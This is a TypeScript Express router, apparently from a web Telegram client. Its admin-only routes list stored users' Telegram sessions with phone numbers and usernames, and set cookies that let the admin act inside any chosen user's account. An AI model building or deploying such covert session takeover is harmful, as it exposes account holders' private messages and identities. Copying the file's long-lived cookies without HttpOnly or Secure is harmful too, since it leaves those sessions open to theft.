import { Router, type IRouter, type Request, type Response } from "express";
import { getAllSessions } from "../telegram/sessionStore";
import { randomUUID } from "node:crypto";

const router: IRouter = Router();

const ADMIN_SECRET = process.env["ADMIN_SECRET"];

const UUID_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
const IMPERSONATE_COOKIE = "tg_impersonate";
const SESSION_COOKIE = "tg_session_id";
const COOKIE_MAX_AGE = 365 * 24 * 60 * 60;

function checkAdmin(req: Request, res: Response): boolean {
  if (!ADMIN_SECRET) {
    res.status(503).json({ error: "Admin not configured. Set the ADMIN_SECRET environment variable." });
    return false;
  }
  const provided = req.headers["x-admin-secret"];
  if (typeof provided !== "string" || provided !== ADMIN_SECRET) {
    res.status(403).json({ error: "Forbidden" });
    return false;
  }
  return true;
}

router.post("/admin/verify", (req: Request, res: Response) => {
  if (!checkAdmin(req, res)) return;
  res.json({ ok: true });
});

router.get("/admin/sessions", (req: Request, res: Response) => {
  if (!checkAdmin(req, res)) return;

  const map = getAllSessions();
  const sessions = Object.entries(map)
    .filter(([, r]) => !!r.sessionString)
    .sort((a, b) => b[1].lastSeen - a[1].lastSeen)
    .map(([sessionId, r]) => ({
      sessionId,
      phone: r.phone ?? null,
      userId: r.userId ?? null,
      firstName: r.firstName ?? null,
      username: r.username ?? null,
      lastSeen: r.lastSeen,
    }));

  res.json({ sessions });
});

// Start impersonating: sets a server-side override cookie so ALL subsequent
// requests (regardless of JS version) use the target's session.
router.post("/admin/impersonate", (req: Request, res: Response) => {
  if (!checkAdmin(req, res)) return;

  const body = (req.body ?? {}) as { targetSessionId?: string };
  const { targetSessionId } = body;

  if (!targetSessionId || !UUID_RE.test(targetSessionId)) {
    res.status(400).json({ error: "Valid targetSessionId required" });
    return;
  }

  const sessions = getAllSessions();
  if (!sessions[targetSessionId]) {
    res.status(404).json({ error: "Session not found" });
    return;
  }

  // Generate a fresh admin token so we can restore the original session later.
  // We store it in a separate cookie rather than trusting the client to remember it.
  const adminToken = randomUUID();

  res.setHeader("Set-Cookie", [
    `${IMPERSONATE_COOKIE}=${targetSessionId}; Path=/; Max-Age=${COOKIE_MAX_AGE}; SameSite=Lax`,
    `tg_admin_token=${adminToken}; Path=/; Max-Age=${COOKIE_MAX_AGE}; SameSite=Lax`,
  ]);
  res.json({ ok: true, targetSessionId });
});

// Stop impersonating: clear the override cookie, browser falls back to own session.
router.post("/admin/stop-impersonate", (req: Request, res: Response) => {
  if (!checkAdmin(req, res)) return;

  res.setHeader("Set-Cookie", [
    `${IMPERSONATE_COOKIE}=; Path=/; Max-Age=0; SameSite=Lax`,
    `tg_admin_token=; Path=/; Max-Age=0; SameSite=Lax`,
  ]);
  res.json({ ok: true });
});

// Return which session is currently active (own vs impersonated).
router.get("/admin/impersonate-status", (req: Request, res: Response) => {
  if (!checkAdmin(req, res)) return;

  const cookieHeader = req.headers.cookie ?? "";
  let impersonating: string | null = null;
  let ownSession: string | null = null;

  for (const pair of cookieHeader.split(";")) {
    const idx = pair.indexOf("=");
    if (idx < 0) continue;
    const k = pair.slice(0, idx).trim();
    const v = pair.slice(idx + 1).trim();
    if (k === IMPERSONATE_COOKIE && UUID_RE.test(v)) impersonating = v;
    if (k === SESSION_COOKIE && UUID_RE.test(v)) ownSession = v;
  }

  res.json({ impersonating, ownSession });
});

export default router;
